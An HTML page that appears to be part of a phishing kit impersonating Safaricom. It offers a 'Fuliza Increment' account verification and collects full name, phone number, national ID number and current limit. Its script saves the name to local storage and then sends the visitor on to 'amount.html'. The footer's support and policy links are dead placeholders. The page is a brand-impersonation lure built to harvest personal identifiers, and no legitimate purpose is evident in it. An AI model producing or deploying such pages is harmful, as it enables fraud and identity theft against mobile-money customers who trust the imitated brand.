<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>— Verify Your Account</title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    min-height:100vh;
    background:#E8F7EF;
    font-family:'Mali',cursive;
    color:#006B3F;
}

.container{
    width:92%;
    max-width:480px;
    margin:auto;
}

header{
    background:#00A651;
    color:#fff;
    padding:22px 0;
    border-bottom:1px solid #00A651;
    text-align:center;
}

.logo{
    font-size:25px;
    font-weight:700;
    color:#fff;
} 

.brand{
    margin-top:4px;
    font-size:13px;
    opacity:.9;
}

.card{
    background:#fff;
    margin-top:24px;
    padding:25px 20px;
    border-radius:14px;
    box-shadow:0 2px 10px rgba(0,0,0,.07);
    border:1px solid #D0EBDD;
}

h1{
    font-size:25px;
    margin-bottom:8px;
    color:#006B3F;
    font-weight:700;
}

.subtitle{
    color:#666;
    font-family:Arial,sans-serif;
    font-size:14px;
    line-height:1.5;
    margin-bottom:22px;
}

label{
    display:block;
    font-size:14px;
    font-weight:600;
    margin-bottom:7px;
    color:#006B3F;
}

input{
    width:100%;
    padding:14px;
    border:1px solid #D0EBDD;
    border-radius:8px;
    font-family:Arial,sans-serif;
    font-size:15px;
    outline:none;
    margin-bottom:17px;
    background:#fff;
    color:#006B3F;
}

input::placeholder{
    color:#999;
}

input:focus{
    border-color:#00A651;
}

.btn{
    width:100%;
    padding:15px;
    border:none;
    border-radius:14px;
    background:#00A651;
    color:#fff;
    font-family:'Mali',cursive;
    font-size:20px;
    font-weight:600;
    cursor:pointer;
    margin-top:4px;
}

.notice{
    margin-top:18px;
    padding:13px;
    background:#E8F7EF;
    border-radius:8px;
    color:#666;
    font-family:Arial,sans-serif;
    font-size:12px;
    line-height:1.5;
}

footer{
    text-align:center;
    padding:24px 10px;
    color:#fff;
    background:#00A651;
    font-family:Arial,sans-serif;
    font-size:12px;
    line-height:1.7;
} 

footer a{
    color:#fff;
    text-decoration:none;
} 
</style> 
</head>

<body>

<header>
    <div class="container">
        SAFARICOM
        <div class="logo"></div>
        <div class="brand"></div>
    </div>
</header>

<main class="container">

    <div class="card">

        <h1>Verify Your Account</h1>

        <p class="subtitle">
            Enter your details below to continue with your
            Fuliza Increment account verification.
        </p>

        <form id="verifyForm">

            <label for="fullName">Full Name</label>
            <input
                type="text"
                id="fullName"
                name="fullName"
                placeholder="Enter your full name"
                required
            >

            <label for="phone">Phone Number</label>
            <input
                type="tel"
                id="phone"
                name="phone"
                placeholder="07XXXXXXXX"
                inputmode="numeric"
                required
            >

            <label for="idNumber">National ID Number</label>
            <input
                type="text"
                id="idNumber"
                name="idNumber"
                placeholder="Enter your ID number"
                inputmode="numeric"
                required
            >

            <label for="limit">Current Limit</label>
            <input
                type="number"
                id="limit"
                name="limit"
                placeholder="Enter your current limit"
                min="0"
                required
            >

            <button type="submit" class="btn">
                Verify Account
            </button>

        </form>

        <div class="notice">
            
        </div>

    </div>

</main>

<footer>
    <a href="#">Terms &amp; Conditions</a> |
    <a href="#">Privacy Policy</a> |
    <a href="#">Support</a>

    <br>

    © © 2026 Safaricom PLC. All rights reserved.
</footer>

<script>
document.getElementById("verifyForm").addEventListener("submit", function(e){
    e.preventDefault();

    const fullName = document.getElementById("fullName").value.trim();
    localStorage.setItem("fullName", fullName);

    const button = document.querySelector(".btn");

    button.textContent = "Processing...";
    button.disabled = true;

    setTimeout(() => {
        window.location.href = "amount.html";
    }, 800);
});
</script>

</body>
</html>
